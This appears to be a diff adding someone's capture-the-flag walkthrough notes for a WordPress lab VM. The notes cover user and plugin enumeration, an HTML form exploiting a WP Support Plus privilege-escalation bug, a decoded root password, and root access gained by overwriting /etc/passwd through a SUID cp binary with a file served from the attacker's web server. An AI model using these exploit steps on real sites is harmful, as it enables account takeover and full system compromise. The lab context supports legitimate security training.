@@ -60,3 +60,148 @@ Target: http://172.16.33.95/
 [23:42:01] 403 -  277B  - /server-status
 [23:44:27] 200 -    7KB - /wordpress/
 [23:44:30] 200 -    2KB - /wordpress/wp-login.php
+
+└─$ wpscan --url http://192.168.56.123/wordpress -e
+
+[+] admin
+ | Found By: Author Posts - Author Pattern (Passive Detection)
+ | Confirmed By:
+ |  Rss Generator (Passive Detection)
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://192.168.56.123/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] aarti
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+//user brute force tell us some plugins
+
+ wp-support-plus-responsive-ticket-system
+ | Location: http://192.168.56.123/wordpress/wp-content/plugins/wp-support-plus-responsive-ticket-system/
+ | Last Updated: 2019-09-03T07:57:00.000Z
+ | [!] The version is out of date, the latest version is 9.1.2
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | Version: 7.1.3 (80% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://192.168.56.123/wordpress/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
+
+[+] wp-symposium
+ | Location: http://192.168.56.123/wordpress/wp-content/plugins/wp-symposium/
+ | Last Updated: 2015-08-21T12:36:00.000Z
+ | [!] The version is out of date, the latest version is 15.8.1
+
+// ticket system, a vuln 
+WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation         | php/webapps/41006.txt
+
+//create a html file
+
+<form action="http:/192.168.56.123/wordpress/wp-admin/admin-ajax.php" method="post">
+    Username: <input type="text" name="username" value="aarti">
+    <input type="hidden" name="email" value="aarti@gmail.com">
+    <input type="hidden" name="action" value="loginGuestFacebook">
+    <input type="submit" value="Login">
+
+
+</form>
+
+//after click the submit, we have login as aarti
+//it seems it is an admin account
+//duder http://192.168.56.123/wordpress/wp-admin/profile.php
+
+Second Flag: 5DD1CC591CE1569A528E3BCF18CEEB5B
+
+RootPassword: SWduaXRlQDEyMw==
+
+➜  ~ echo SWduaXRlQDEyMw== | base64 -d
+Ignite@123
+
+$ pwd
+/home/raj
+
+$ cat flag1.txt
+aHR0cHM6Ly93d3cuaGFja2luZ2FydGljbGVzLmlu
+
+$ find / -perm -u=s 2>/dev/null
+/usr/sbin/pppd
+/usr/bin/chfn
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/sudo
+/usr/bin/arping
+/usr/bin/wget
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/traceroute6.iputils
+/usr/bin/gpasswd
+/usr/bin/vmware-user-suid-wrapper
+/usr/lib/xorg/Xorg.wrap
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/snapd/snap-confine
+/bin/fusermount
+/bin/umount
+/bin/mount
+/bin/ping
+/bin/cp
+/bin/su
+/snap/core/6350/bin/mount
+/snap/core/6350/bin/ping
+/snap/core/6350/bin/ping6
+/snap/core/6350/bin/su
+/snap/core/6350/bin/umount
+/snap/core/6350/usr/bin/chfn
+/snap/core/6350/usr/bin/chsh
+/snap/core/6350/usr/bin/gpasswd
+/snap/core/6350/usr/bin/newgrp
+/snap/core/6350/usr/bin/passwd
+/snap/core/6350/usr/bin/sudo
+/snap/core/6350/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/6350/usr/lib/openssh/ssh-keysign
+/snap/core/6350/usr/lib/snapd/snap-confine
+/snap/core/6350/usr/sbin/pppd
+
+//for cp has suid, we create a user with root privi then cp it ot overwrite passwd, 
+└─$ openssl passwd -1 -salt new 333444
+$1$new$j/WIoc8tn3gx4iUHj1V/Z1
+
+└─$ sudo nano passwd 
+
+└─$ python3 -m http.server 8821                          
+Serving HTTP on 0.0.0.0 port 8821 (http://0.0.0.0:8821/) ...
+192.168.56.123 - - [27/Feb/2025 22:03:06] "GET /passwd HTTP/1.1" 200 -
+
+$ python3 -c "import pty; pty.spawn ('/bin/bash')" 
+
+www-data@ubuntu:/$ su new
+
+new@ubuntu:/root# ls
+ls
+proof.txt
+new@ubuntu:/root# cat proof.txt
+cat proof.txt
+_________________________________________________________________________
+ _____     _   _   U _____ u     U _____ u   _   _       ____     	|	
+ |_ " _|   |'| |'|  \| ___"|/     \| ___"|/  | \ |"|     |  _"\   	|
+   | |    /| |_| |\  |  _|"        |  _|"   <|  \| |>   /| | | |  	|	
+  /| |\   U|  _  |u  | |___        | |___   U| |\  |u   U| |_| |\ 	|
+ u |_|U    |_| |_|   |_____|       |_____|   |_| \_|     |____/ u 	|
+ _// \\_   //   \\   <<   >>       <<   >>   ||   \\,-.   |||_    	|
+(__) (__) (_") ("_) (__) (__)     (__) (__)  (_")  (_/   (__)_)   	|
+									|
+									|
+!! Congrats you have finished this task !!				|
+									|
+Contact us here:							|
+									|
+Hacking Articles : https://twitter.com/rajchandel/			|
+									|
+									|
++-+-+-+-+-+ +-+-+-+-+-+-+-+						|
+ |E|n|j|o|y| |H|A|C|K|I|N|G|						|
+ +-+-+-+-+-+ +-+-+-+-+-+-+-+				
